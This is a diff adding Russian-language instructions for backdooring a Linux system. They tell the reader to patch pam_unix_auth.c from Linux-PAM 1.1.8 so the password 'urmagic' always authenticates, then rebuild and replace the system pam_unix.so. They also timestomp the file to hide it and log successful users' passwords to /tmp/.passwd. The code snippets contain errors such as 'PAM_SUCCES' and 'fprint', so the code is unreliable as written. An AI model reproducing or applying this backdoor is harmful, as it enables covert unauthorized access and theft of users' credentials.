@@ -1,1 +1,19 @@
-1
+Бедкор
+  Качай (http://www.linux-pam.org/library/Linux-PAM-1.1.8.tar.gz), иди в Linux-PAM-1.1.8/modules/pam_unix/pam_unix_auth.c и буквально на 4 строке
+  (после retval)  дописывай такой код  (if (strcmp(p,"urmagic") == 0) {
+                                            retval = PAM_SUCCES;
+                                         }                                 )
+  Потом собирай можуль и заменяй им оригинальный  $ ./configure
+                                                  $ make
+                                                  $ sudo cp Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /lib/x86_64-linux-gnu/security/
+   И чисто для конспирации даём время нашему модулю как и у остальных $ sudo touch -r /lib/x86_64-linux-gnu/security/pam_ftp.so /lib/x86_64-linux-gnu/security/pam_unix.so
+        Так же, можешь логировать пассы успешно вошедших юзеров, чеб нет? добавь такой код туда же в pam_unix.so (if (retval == PAM_SUCCESS){
+                                                                                                                     FILE *fg;
+                                                                                                                     fg = fopen("/tmp/.passwd", "a");
+                                                                                                                     fprint(fg, "%s:%s/n", name, p);
+                                                                                                                     fclose
+                                                                                                                   }                                            )
+                                                                                                                   
+                                                                                                                   
+   
+ 
